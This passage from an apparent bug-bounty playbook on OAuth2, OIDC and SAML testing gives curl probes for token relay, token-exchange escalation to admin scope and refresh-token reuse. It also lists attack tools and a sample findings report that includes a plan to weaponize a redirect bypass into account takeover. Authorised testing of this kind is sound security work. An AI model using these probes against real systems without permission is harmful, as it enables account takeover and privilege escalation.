5. Attacker logs in via "Login with Google" -> lands in victim's account

Severity: HIGH-CRITICAL depending on user interaction required
```

---

## Step 20 — Token Exchange & Relay Attacks

```bash
# --- 20a. Token relay (confused deputy) ---
# If App A gets a token for the user and sends it to App B's API:
# App B might trust the token without checking the audience (aud claim)

# Get a token for one resource, try it on another
ACCESS_TOKEN="token_for_app_a"
curl -sk "https://app-b.target.com/api/me" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}"
# If accepted -> missing audience validation

# --- 20b. Token exchange (RFC 8693) ---
# If the target supports token exchange, try escalating
curl -sk -X POST "https://TARGET/oauth/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "subject_token=${ACCESS_TOKEN}" \
  -d "subject_token_type=urn:ietf:params:oauth:token-type:access_token" \
  -d "resource=https://admin-api.target.com" \
  -d "scope=admin"
# If this returns a token with elevated privileges -> token exchange abuse

# --- 20c. Refresh token rotation ---
# Check if old refresh tokens are invalidated after use
REFRESH="valid_refresh_token"
# Use it once
curl -sk -X POST "https://TARGET/oauth/token" \
  -d "grant_type=refresh_token&refresh_token=${REFRESH}&client_id=${CLIENT_ID}"
# Use the same refresh token again
curl -sk -X POST "https://TARGET/oauth/token" \
  -d "grant_type=refresh_token&refresh_token=${REFRESH}&client_id=${CLIENT_ID}"
# If both succeed -> refresh token reuse (stolen token remains valid indefinitely)
```

---

## Tools Reference

```bash
# --- SAML tools ---
# SAMLRaider — Burp Suite extension for SAML testing
# Install: BApp Store -> SAMLRaider
# Features: automatic XSW attacks, certificate cloning, message editing

# EvilSAML — generate malicious SAML responses
# https://github.com/AresS31/EvilSAML
pip install evilsaml

# saml-decoder — decode/encode SAML messages
# https://github.com/mkomber/saml-decoder
pip install saml-decoder

# --- OAuth tools ---
# oauth-redirect-checker — test redirect_uri validation
# https://github.com/nickcano/oauth-redirect-checker

# Burp OAuth Scanner — automated OAuth flow testing
# Install: BApp Store -> OAuth Scanner

# jwt_tool — JWT manipulation and attack
# https://github.com/ticarpi/jwt_tool
pip install pyjwt
git clone https://github.com/ticarpi/jwt_tool.git

# --- General ---
# xmlsec1 — XML signature verification and signing
brew install xmlsec1  # macOS
# apt install xmlsec1 libxmlsec1-dev  # Linux

# Burp Suite extensions to install:
# - SAMLRaider
# - OAuth Scanner
# - JSON Web Token Attacker
# - SAML Editor
# - Auth Analyzer (for auth bypass testing across all flows)

# nuclei templates for OAuth/SAML
nuclei -t http/vulnerabilities/oauth/ -u "https://TARGET"
nuclei -t http/misconfiguration/ -tags saml -u "https://TARGET"
nuclei -t http/exposures/configs/ -tags oauth -u "https://TARGET"
```

---

## Output

```
PLAYBOOK : OAuth2 / OIDC / SAML / SSO Testing
TARGET   : https://target.com
AUTH TYPE: OAuth2 (Authorization Code) + SAML 2.0 SP
IdP      : Azure AD / Entra ID
-----------------------------------------------------
FINDINGS:
  [CRITICAL] redirect_uri bypass via open redirect chain -> auth code theft -> ATO
  [CRITICAL] XSW3 accepted by SP -> NameID spoofing to admin
  [HIGH]     State parameter not validated -> CSRF on OAuth account linking
  [HIGH]     PKCE not enforced on public client -> auth code interception
  [HIGH]     ROPC flow enabled -> MFA bypass for Azure AD users
  [MEDIUM]   Refresh token not rotated -> stolen token persists indefinitely
  [MEDIUM]   SSO logout does not invalidate SP session (SLO failure)
  [MEDIUM]   SAML Response replay accepted (NotOnOrAfter not enforced)
  [LOW]      OIDC discovery endpoint exposes internal endpoint URLs
  [LOW]      Azure AD user enumeration via error code differentiation
-----------------------------------------------------
NEXT STEPS:
  1. Weaponize redirect_uri bypass -> full ATO PoC with token theft
  2. Report XSW as CRITICAL with SAMLRaider evidence
  3. Test account linking CSRF -> confirm ATO chain
  4. Load 03_reporting/report_writer.md for each confirmed finding
  5. Load 03_reporting/severity_scorer.md for bounty estimation
```
